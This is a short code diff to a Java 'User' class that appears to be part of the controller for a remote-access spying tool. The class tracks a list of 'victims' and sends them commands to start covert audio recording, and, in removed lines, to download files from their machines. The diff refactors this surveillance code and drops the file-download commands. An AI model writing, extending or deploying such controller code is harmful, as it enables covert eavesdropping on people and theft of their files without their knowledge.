@@ -15,6 +15,7 @@ public class User extends Client {
     User(ChannelHandlerContext context, JSONObject dbData) {
         this.context = context;
         this.dbData = dbData;
+        this.name = (String) dbData.get("login");
         String login = (String) dbData.get("login");
         String password = (String) dbData.get("password");
         this.token = getHash(login + password + Config.SECRET_KEY);
@@ -22,16 +23,12 @@ public class User extends Client {
 
     protected void sendMessage(JSONObject message) {
         SocketAddress address = context.channel().remoteAddress();
-        System.out.println(dbData.get("login") + " ("+ address + ") << " + message);
+        System.out.println(name + " ("+ address + ") << " + message);
         context.writeAndFlush(message);
     }
 
     public JSONObject getDbData() {
         return dbData;
-    }
-
-    String getLogin() {
-        return (String) dbData.get("login");
     }
 
     ArrayList<String> getVictims() {
@@ -172,24 +169,6 @@ public class User extends Client {
     void sendStartAudioRecord(String code, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "start.audio.record");
-        query.put("code", code);
-        query.put("victim", victim);
-        sendMessage(query);
-    }
-
-    void sendStartDownloadFile(String filename, long port, String victim) {
-        JSONObject query = new JSONObject();
-        query.put("action", "start.download.file");
-        query.put("filename", filename);
-        query.put("port", port);
-        query.put("victim", victim);
-        sendMessage(query);
-    }
-
-    void sendFinishDownloadFile(String filename, String code, String victim) {
-        JSONObject query = new JSONObject();
-        query.put("action", "finish.download.file");
-        query.put("filename", filename);
         query.put("code", code);
         query.put("victim", victim);
         sendMessage(query);
